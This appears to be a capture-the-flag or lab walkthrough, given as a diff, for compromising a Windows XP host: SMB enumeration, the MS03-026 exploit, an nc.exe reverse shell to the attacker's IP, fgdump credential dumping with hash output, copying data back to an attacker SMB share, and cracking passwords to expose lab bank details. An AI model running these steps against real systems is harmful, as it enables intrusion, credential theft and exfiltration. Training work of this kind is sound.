@@ -1,0 +1,56 @@
+# 1 enumerate smb
+enum4linux-ng.py -A $IP
+
+# 2 found exploit
+microsoft Windows XP/2000 - 'RPC DCOM' Remote (MS03-026) | windows/remote/66.c
+
+# 3 get access by shell from the 66.c
+# flag location: C:\Documents and Settings\Administrator\Desktop
+
+# bonus >>>
+
+# open smb server from kali (equivalent to open python http server)
+impacket-smbserver smb_share .
+
+# connect to smb from target
+net use * \\192.168.119.191\smb_share
+
+# copy tools from kali to target through smb (equivalent to wgetfrom python http server)
+copy Z:\nc.exe
+copy Z:\whoami.exe 
+copy Z:\fgdump.exe
+
+# get stable shell with nc
+nc.exe -nv 192.168.119.191 10000 -e cmd.exe
+
+# windows set PATH so that a certain command can be call within other dir
+set PATH%PATH%;C:\Windows\Temp
+
+# dump credentials
+fgdump.exe
+> 127.0.0.1.pwdump
+Administrator:500:NO PASSWORD*********************:A8C8B7A37513B7EB9308952B814B522B:::
+alice:1004:NO PASSWORD*********************:B74242F37E47371AFF835A6EBCAC4FFE:::
+Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::
+HelpAssistant:1000:05FA67EAEC4D789EC4BD52F48E5A6B28:2733CDB0D8A1FEC3F976F3B8AD1DEEEF:::
+SUPPORT_388945a0:1002:NO PASSWORD*********************:0F7A50DD4B95CEC4C1DEA566F820F4E7:::
+
+# send exposed files (send data back to smb server on kali)
+copy bank-account.zip Z:\
+copy 127.0.0.1.pwdump Z:\
+
+# crack alice password
+B74242F37E47371AFF835A6EBCAC4FFE:aliceishere
+
+# crack zip file password
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip
+password: alice
+
+# open bank account to get info
+libreoffice bank-account.xl
+Bank			Gold Swiss
+Acct			2342364-KIETGGE-298074
+SWIDF ID		swisgi
+Reg Username	bobw@acme.local
+Acct Password	3v1lp@ss
+
